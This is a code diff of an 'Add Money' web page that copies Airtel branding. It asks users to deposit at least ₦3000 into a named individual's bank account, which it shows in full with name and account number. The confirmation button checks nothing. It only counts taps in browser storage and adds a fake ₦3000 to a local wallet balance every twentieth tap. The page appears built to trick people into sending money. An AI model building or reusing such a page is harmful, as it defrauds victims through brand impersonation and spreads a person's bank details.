@@ -1,242 +1,168 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Add Money</title>
   <style>
     body {
       margin: 0;
-      font-family: Arial, sans-serif;
+      font-family: sans-serif;
       background-color: #fff;
-      position: relative;
-      overflow-x: hidden;
-    }
-
-    /* Faint Airtel logo background animation */
-    .background-logos {
-      position: fixed;
-      width: 100%;
-      height: 100%;
-      z-index: 0;
-      top: 0;
-      left: 0;
-      pointer-events: none;
-      opacity: 0.05;
       overflow: hidden;
-    }
+    }.container {
+  padding: 20px;
+  position: relative;
+  z-index: 1;
+}
 
-    .background-logos img {
-      position: absolute;
-      width: 80px;
-      animation: float 12s linear infinite;
-    }
+.background-logo {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  background-image: url('airtel-logo.png'); /* use your logo path here */
+  background-size: contain;
+  background-repeat: no-repeat;
+  background-position: center;
+  opacity: 0.05;
+  z-index: 0;
+}
 
-    @keyframes float {
-      from {
-        transform: translateY(100vh) rotate(0deg);
-      }
-      to {
-        transform: translateY(-120vh) rotate(360deg);
-      }
-    }
+.airtel-top-logo {
+  width: 80px;
+  display: block;
+  margin: 0 auto 20px;
+}
 
-    .container {
-      position: relative;
-      z-index: 1;
-      padding: 20px;
-      text-align: center;
-    }
+.card {
+  background: #fff;
+  border-radius: 20px;
+  padding: 20px;
+  box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
+  max-width: 400px;
+  margin: 0 auto;
+  position: relative;
+}
 
-    .airtel-animation {
-      height: 150px;
-      margin-bottom: 10px;
-      position: relative;
-    }
+input {
+  width: 100%;
+  padding: 12px;
+  font-size: 16px;
+  margin-bottom: 15px;
+  border-radius: 8px;
+  border: 1px solid #ccc;
+}
 
-    .logo-piece {
-      position: absolute;
-      width: 40px;
-      height: 40px;
-      background-image: url('airtel-logo.png');
-      background-size: cover;
-      animation: gather 2s forwards ease-in-out;
-    }
+button {
+  background-color: red;
+  color: #fff;
+  border: none;
+  padding: 12px;
+  width: 100%;
+  font-size: 16px;
+  border-radius: 8px;
+  cursor: pointer;
+}
 
-    @keyframes gather {
-      0% {
-        transform: translate(
-          calc(-30px + 60px * random()), 
-          calc(-30px + 60px * random())
-        );
-        opacity: 0;
-      }
-      100% {
-        transform: translate(50px, 50px);
-        opacity: 1;
-      }
-    }
+#loader {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  background: rgba(255, 255, 255, 0.9);
+  z-index: 9999;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+}
 
-    .input-section {
-      margin: 20px auto;
-      max-width: 300px;
-    }
+.piece {
+  position: absolute;
+  width: 20px;
+  height: 20px;
+  background-image: url('airtel-logo-piece.png'); /* small logo piece */
+  background-size: cover;
+  animation: fly-in 1s forwards;
+}
 
-    input[type="number"] {
-      width: 100%;
-      padding: 10px;
-      font-size: 18px;
-      border: 2px solid red;
-      border-radius: 10px;
-    }
+@keyframes fly-in {
+  0% {
+    transform: translateY(100vh) scale(0);
+    opacity: 0;
+  }
+  100% {
+    transform: translateY(0) scale(1);
+    opacity: 1;
+  }
+}
 
-    button {
-      margin-top: 15px;
-      padding: 12px 25px;
-      font-size: 16px;
-      background-color: red;
-      color: white;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-    }
-
-    .popup {
-      display: none;
-      position: fixed;
-      top: 20%;
-      left: 50%;
-      transform: translateX(-50%);
-      background: white;
-      border: 2px solid red;
-      padding: 20px;
-      border-radius: 15px;
-      z-index: 10;
-      text-align: center;
-    }
-
-    .account-details {
-      margin-top: 20px;
-      display: none;
-    }
-
-    .account-card {
-      background: white;
-      border: 1px solid #ccc;
-      border-radius: 15px;
-      padding: 20px;
-      max-width: 350px;
-      margin: 0 auto;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-      position: relative;
-      text-align: center;
-    }
-
-    .account-card img {
-      width: 90px;
-      margin-bottom: 10px;
-    }
-
-    .account-card h3 {
-      color: red;
-      margin-bottom: 10px;
-    }
-
-    .account-card p {
-      font-size: 18px;
-      margin: 6px 0;
-    }
   </style>
 </head>
 <body>
+  <div class="background-logo"></div>  <div class="container">
+    <div class="card" id="amountCard">
+      <img src="airtel-logo.png" alt="Airtel Logo" class="airtel-top-logo">
+      <input type="number" id="amountInput" placeholder="Enter amount (minimum ₦3000)" />
+      <button onclick="showLoader()">Continue</button>
+    </div><div class="card" id="accountDetails" style="display: none">
+  <img src="airtel-logo.png" alt="Airtel Logo" class="airtel-top-logo">
+  <p><strong>Account Name:</strong> EMMANUEL OKWUNNA</p>
+  <p><strong>Bank:</strong> SmartCash Payment Service Bank</p>
+  <p><strong>Account Number:</strong> 812 489 0070</p>
+  <button onclick="tapPayment()">I have made payments</button>
+</div>
 
-  <!-- Faint floating Airtel background logos -->
-  <div class="background-logos">
-    <img src="airtel-logo.png" style="left: 10%; animation-delay: 0s;">
-    <img src="airtel-logo.png" style="left: 40%; animation-delay: 3s;">
-    <img src="airtel-logo.png" style="left: 70%; animation-delay: 6s;">
-    <img src="airtel-logo.png" style="left: 25%; animation-delay: 1.5s;">
-    <img src="airtel-logo.png" style="left: 80%; animation-delay: 4s;">
-  </div>
+  </div>  <div id="loader">
+    <p>Please wait...</p>
+    <div id="animationArea"></div>
+  </div>  <script>
+    let tapCount = localStorage.getItem('tapCount') || 0;
 
-  <div class="container">
-    <!-- Airtel gathering logo animation -->
-    <div class="airtel-animation" id="logoContainer"></div>
-
-    <!-- Amount Input -->
-    <div class="input-section">
-      <input type="number" id="amount" placeholder="Enter amount (min ₦3000)">
-      <button onclick="proceed()">Continue</button>
-    </div>
-
-    <!-- Popup Message -->
-    <div class="popup" id="popup"></div>
-
-    <!-- Account Details -->
-    <div class="account-details" id="accountDetails">
-      <div class="account-card">
-        <img src="airtel-logo.png" alt="Airtel Logo">
-        <h3>Send Money To:</h3>
-        <p><strong>Name:</strong> EMMANUEL OKWUNNA</p>
-        <p><strong>Bank:</strong> SmartCash Payment Service Bank</p>
-        <p><strong>Account Number:</strong> 812 489 0070</p>
-        <button onclick="confirmPayment()">I Have Made Payment</button>
-      </div>
-    </div>
-  </div>
-
-  <script>
-    const popup = document.getElementById("popup");
-    const accountDetails = document.getElementById("accountDetails");
-    const logoContainer = document.getElementById("logoContainer");
-
-    // Add scattered Airtel logo pieces (no zooming)
-    for (let i = 0; i < 15; i++) {
-      const piece = document.createElement("div");
-      piece.classList.add("logo-piece");
-      piece.style.left = `${40 + Math.random() * 30}px`;
-      piece.style.top = `${40 + Math.random() * 30}px`;
-      piece.style.animationDelay = `${Math.random()}s`;
-      logoContainer.appendChild(piece);
-    }
-
-    // Show popup
-    function showPopup(message) {
-      popup.innerText = message;
-      popup.style.display = "block";
-      setTimeout(() => {
-        popup.style.display = "none";
-      }, 2500);
-    }
-
-    // Continue button logic
-    function proceed() {
-      const amount = parseInt(document.getElementById("amount").value);
+    function showLoader() {
+      const amount = parseInt(document.getElementById('amountInput').value);
       if (isNaN(amount) || amount < 3000) {
-        showPopup("Please enter minimum of ₦3000");
-      } else {
-        showPopup("Please wait...");
-        setTimeout(() => {
-          popup.style.display = "none";
-          accountDetails.style.display = "block";
-        }, 2000);
+        alert("Please input minimum of ₦3000");
+        return;
+      }
+
+      document.getElementById('loader').style.display = 'flex';
+      runLogoAnimation();
+
+      setTimeout(() => {
+        document.getElementById('loader').style.display = 'none';
+        document.getElementById('amountCard').style.display = 'none';
+        document.getElementById('accountDetails').style.display = 'block';
+      }, 3000);
+    }
+
+    function runLogoAnimation() {
+      const container = document.getElementById('animationArea');
+      container.innerHTML = '';
+      for (let i = 0; i < 20; i++) {
+        const piece = document.createElement('div');
+        piece.className = 'piece';
+        piece.style.top = Math.random() * window.innerHeight + 'px';
+        piece.style.left = Math.random() * window.innerWidth + 'px';
+        container.appendChild(piece);
       }
     }
 
-    // Payment taps tracking
-    let taps = parseInt(localStorage.getItem("paymentTaps")) || 0;
+    function tapPayment() {
+      tapCount++;
+      localStorage.setItem('tapCount', tapCount);
 
-    function confirmPayment() {
-      taps++;
-      localStorage.setItem("paymentTaps", taps);
-      showPopup("Please wait while we confirm your transaction...");
+      alert("Please wait, we are confirming your transaction...");
 
-      if (taps % 20 === 0) {
-        let balance = parseInt(localStorage.getItem("walletBalance")) || 0;
-        balance += 3000;
-        localStorage.setItem("walletBalance", balance);
+      if (tapCount % 20 === 0) {
+        let balance = localStorage.getItem('walletBalance') || 0;
+        balance = parseInt(balance) + 3000;
+        localStorage.setItem('walletBalance', balance);
+        alert("Your wallet has been funded with ₦3000");
       }
     }
-  </script>
-
-</body>
+  </script></body>
 </html>
